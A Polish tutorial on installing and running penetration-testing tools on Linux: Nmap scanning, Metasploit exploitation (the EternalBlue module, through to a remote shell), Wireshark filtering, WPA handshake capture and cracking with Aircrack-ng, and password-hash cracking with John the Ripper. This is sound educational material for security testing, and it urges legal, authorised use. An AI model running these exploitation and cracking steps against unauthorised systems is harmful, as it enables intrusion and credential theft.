# **Poradnik Instalacji i Używania Narzędzi Hakerskich na Linuxie**

## **1. Nmap - Skaner Sieci**

Nmap to jedno z najpotężniejszych narzędzi do skanowania sieci, używane do wykrywania urządzeń w sieci, sprawdzania otwartych portów, wykrywania usług, systemów operacyjnych i podatności. 

### **Instalacja**
Aby zainstalować Nmap na systemie Linux (Ubuntu/Debian):
```bash
sudo apt update
sudo apt install nmap
```

### **Podstawowe Użycie**
1. **Skanowanie pojedynczego adresu IP:**
```bash
nmap 192.168.1.1
```
To polecenie sprawdza, które porty są otwarte na danym adresie IP.

2. **Skanowanie całej sieci lokalnej (np. 192.168.1.0/24):**
```bash
nmap 192.168.1.0/24
```
To przeskanuje wszystkie urządzenia w sieci lokalnej w zakresie od 192.168.1.1 do 192.168.1.254.

3. **Skanowanie z wykrywaniem systemu operacyjnego (OS detection):**
```bash
nmap -O 192.168.1.1
```
To komenda używa algorytmów Nmap do próby identyfikacji systemu operacyjnego na urządzeniu.

4. **Skanowanie z identyfikacją wersji usług:**
```bash
nmap -sV 192.168.1.1
```
Ta opcja wykrywa wersje usług uruchomionych na dostępnych portach (np. Apache, SSH).

5. **Skanowanie portów UDP (domyślnie Nmap skanuje tylko porty TCP):**
```bash
nmap -sU 192.168.1.1
```

6. **Skanowanie z użyciem skryptów Nmap (NSE):**
```bash
nmap --script vuln 192.168.1.1
```
Ta opcja uruchamia skrypty Nmap do wykrywania potencjalnych podatności.

---

## **2. Metasploit Framework**

Metasploit jest jednym z najpotężniejszych narzędzi wykorzystywanych w testach penetracyjnych, używanym do eksploatacji podatności w systemach. Oferuje bogaty zestaw exploitów, payloadów, oraz narzędzi do post-exploitation.

### **Instalacja**
Na systemie Ubuntu/Debian:
```bash
sudo apt update
sudo apt install metasploit-framework
```

Aby upewnić się, że instalacja się powiodła, uruchom Metasploit:
```bash
msfconsole
```

### **Podstawowe Użycie**
1. **Uruchomienie Metasploit:**
```bash
msfconsole
```
Po uruchomieniu Metasploit pojawi się interfejs konsolowy, w którym będziesz mógł wprowadzać komendy.

2. **Wyszukiwanie exploitów:**
```bash
search <nazwa_podatności>
```
Np. dla exploita dla systemu Windows:
```bash
search windows
```

3. **Wybór exploita:**
Po znalezieniu interesującego exploita, aby go wybrać, użyj komendy:
```bash
use <nazwa_exploita>
```
Np. `use exploit/windows/smb/ms17_010_eternalblue`.

4. **Konfiguracja exploitów:**
Po wybraniu exploita, musisz ustawić odpowiednie opcje, takie jak adres docelowy i lokalny adres (twojego maszyny):
```bash
set RHOST <adres_docelowy>
set LHOST <twój_adres_IP>
```

5. **Uruchomienie exploita:**
```bash
exploit
```
Metasploit zacznie próbować wykorzystać podatność na docelowym systemie.

6. **Uzyskanie dostępu do systemu:**
Po udanym ataku Metasploit utworzy połączenie z systemem i otworzy sesję powłoki (shell) na zdalnej maszynie.

---

## **3. Wireshark - Analityk Protokołów Sieciowych**

Wireshark to narzędzie do analizy ruchu sieciowego. Pozwala przechwytywać pakiety i analizować je w celu wykrywania problemów w sieci, a także do testów związanych z bezpieczeństwem.

### **Instalacja**
Na systemie Linux (Ubuntu/Debian):
```bash
sudo apt update
sudo apt install wireshark
```

### **Podstawowe Użycie**
1. **Uruchomienie Wireshark:**
```bash
sudo wireshark
```
Aby uruchomić Wireshark, musisz mieć uprawnienia administratora, ponieważ musisz przechwytywać pakiety na poziomie systemu.

2. **Wybór interfejsu do przechwytywania pakietów:**
Po uruchomieniu Wireshark, wybierz interfejs sieciowy, na którym chcesz przechwytywać ruch (np. eth0, wlan0).

3. **Filtracja pakietów:**
Wireshark pozwala na łatwą filtrację przechwyconych pakietów. Na przykład:
- Aby filtracja po protokole TCP:
```bash
tcp
```
- Filtracja po adresie IP:
```bash
ip.addr == 192.168.1.1
```
- Filtracja po porcie:
```bash
tcp.port == 80
```

4. **Analiza przechwyconych pakietów:**
Wireshark umożliwia szczegółową analizę każdego pakietu – jego nagłówków, danych itp. Możesz kliknąć na pakiet, aby zobaczyć pełne informacje.

---

## **4. Aircrack-ng - Łamanie Haseł Wi-Fi**

Aircrack-ng to narzędzie do przeprowadzania testów penetracyjnych na sieciach bezprzewodowych, w tym łamanie haseł WEP i WPA-PSK.

### **Instalacja**
Na systemie Linux:
```bash
sudo apt update
sudo apt install aircrack-ng
```

### **Podstawowe Użycie**
1. **Uruchamianie monitorowania interfejsu sieciowego:**
```bash
sudo airmon-ng start wlan0
```
Włącz tryb monitorowania na interfejsie Wi-Fi (np. wlan0).

2. **Przechwytywanie pakietów (airdump):**
```bash
sudo airodump-ng wlan0mon
```
Airodump-ng wyświetli listę dostępnych sieci i pozwoli na wybór, którą chcesz monitorować.

3. **Przechwytywanie handshake (WPA):**
Aby przechwycić handshake, który pozwoli na złamanie hasła WPA, użyj:
```bash
sudo airodump-ng --bssid <MAC_adres_AP> -c <kanał> -w <plik_zrzutu> wlan0mon
```

4. **Łamanie hasła WPA:**
Po przechwyceniu handshake uruchom:
```bash
aircrack-ng -w <ścieżka_do_wordlist> <plik_zrzutu>
```
Zostanie przeprowadzone łamanie hasła przy użyciu słownika.

---

## **5. John the Ripper - Łamanie Haseł**

John the Ripper to potężne narzędzie do łamania haseł, obsługujące wiele algorytmów, takich jak MD5, SHA1 i inne.

### **Instalacja**
```bash
sudo apt update
sudo apt install john
```

### **Podstawowe Użycie**
1. **Łamanie plików hash:**
Aby złamać hasło z pliku hash, użyj:
```bash
john <plik_hash>
```

2. **Używanie słownika do łamania haseł:**
Aby użyć własnego słownika (wordlist):
```bash
john --wordlist=<ścieżka_do_wordlist> <plik_hash>
```

3. **Sprawdzanie postępu:**
Aby sprawdzić, jak długo John the Ripper pracuje nad łamaniem hasła:
```bash
john --status
```

4. **Zakończenie łamania hasła:**
Aby zakończyć sesję łamania haseł i zapisać wyniki:
```bash
john --show <plik_hash>
```

---

Te narzędzia są potężnymi zasobami w arsenale hakerskim i powinny być używane odpowiedzialnie. Zawsze pamiętaj, by działać zgodnie z prawem i uzyskiwać pozwolenie przed testowaniem jakiejkolwiek sieci lub systemu.
